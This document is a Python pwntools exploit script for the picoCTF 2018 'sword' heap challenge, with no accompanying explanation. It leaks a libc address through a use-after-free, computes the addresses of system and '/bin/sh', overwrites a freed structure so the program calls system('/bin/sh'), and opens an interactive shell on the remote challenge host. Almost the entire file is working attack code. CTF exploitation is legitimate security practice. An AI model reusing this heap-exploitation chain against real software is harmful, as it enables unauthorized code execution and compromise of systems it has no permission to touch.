#! /usr/bin/env python
from binascii import unhexlify
import os
import sys
#
from pwn import context, p64, u64, log, process, remote, args
from pwn import gdb, ELF
context.clear(arch='amd64', os='linux')


class ExploitInfo:
    host = '2018shell2.picoctf.com'
    port = 43469
    name            = 'sword'
    elf             = ELF(name)
    libc_name       = 'libc.so.6'
    LIBC            = ELF(libc_name)
    gdb = r"""
b 95
b 177
c

printf "--- sword_lists ------------------------------------\n"
p sword_lists
set $sword0=sword_lists[0].sword
set $sword1=sword_lists[1].sword
printf "--- heap mapping -----------------------------------\n"
x/32xg $sword0
printf "--- string of sword1 -------------------------------\n"
x/s $sword1->sword_name

c
"""


def get_process():
    p = None
    if args.REMOTE:
        p = remote(ExploitInfo.host, ExploitInfo.port)
    else:
        p = process('./%s' % ExploitInfo.name)
        if args.GDB:
            gdb.attach(p.pid, ExploitInfo.gdb)
    return p


def create_sword(p):
    p.sendlineafter('Quit.\n', '1')
    p.recvuntil('index is ')
    idx = p.recv(1)
    idx = int(idx)
    return idx


def show_sword(p, index):
    p.sendlineafter('Quit.\n', '3')
    p.sendlineafter('?\n', str(index))
    p.recvuntil('The name is ')
    leak = p.recv(6)  # at least 6 byte address on amd64 system
    leak = leak.ljust(8, '\x00')
    leak = u64(leak)
    return leak


def free_sword(p, index):
    p.sendlineafter('Quit.\n', '4')
    p.sendlineafter('?\n', str(index))


def harden_sword(p, index, length, sword_name, weight=-1):
    p.sendlineafter('Quit.\n', '5')
    p.sendlineafter('?\n', str(index))
    p.sendlineafter('?\n', str(length))
    p.sendlineafter('.\n', sword_name)
    p.sendlineafter('?\n', str(weight))


def equip_sword(p, index):
    p.sendlineafter('Quit.\n', '6')
    p.sendlineafter('?\n', str(index))


def main():
    elf = ExploitInfo.elf
    libc = ExploitInfo.LIBC
    OFFSET_bin_sh = 0x0018cd57

    with get_process() as p:
        # -- stage 1 ---------------------------------------------------------------

        idx = create_sword(p)

        # pretending printf, but got null in its address
        payload  = 'A' * 8
        payload += p64(elf.got['puts'])
        BUF_LEN  = 256
        payload += 'A' * (BUF_LEN - 1 - len(payload))
        #assert('\x00' not in payload)
        assert('\n' not in payload)

        harden_sword(p, idx, BUF_LEN, payload)
        free_sword(p, idx)

        idx1 = create_sword(p)
        idx2 = create_sword(p)

        ADDR_puts = show_sword(p, idx2)
        libc.address = ADDR_puts - libc.symbols['puts']
        ADDR_bin_sh = libc.address + OFFSET_bin_sh
        ADDR_system = libc.symbols['system']
        log.info("puts @ plt    : 0x%08x", ADDR_puts)
        log.info('libc          : 0x%08x' % (libc.address))
        log.info('bin_sh        : 0x%08x' % (ADDR_bin_sh))
        log.info('system        : 0x%08x' % (ADDR_system))

        harden_sword(p, idx2, BUF_LEN, '')
        harden_sword(p, idx1, BUF_LEN, '')

        free_sword(p, idx2)
        free_sword(p, idx1)

        # -- stage 2 ---------------------------------------------------------------

        idx3 = create_sword(p)

        payload = 'A' * 8
        payload += p64(ADDR_bin_sh)
        payload += p64(ADDR_system)
        payload += 'A' * (BUF_LEN - 1 - len(payload))
        assert('\n' not in payload)
        harden_sword(p, idx3, BUF_LEN, payload)
        free_sword(p, idx3)

        idx4 = create_sword(p)
        idx5 = create_sword(p)

        equip_sword(p, idx5)

        p.clean()
        p.sendline('ls -la')
        p.interactive()

        # -- stage 3 ---------------------------------------------------------------


if __name__ == "__main__":
    main()
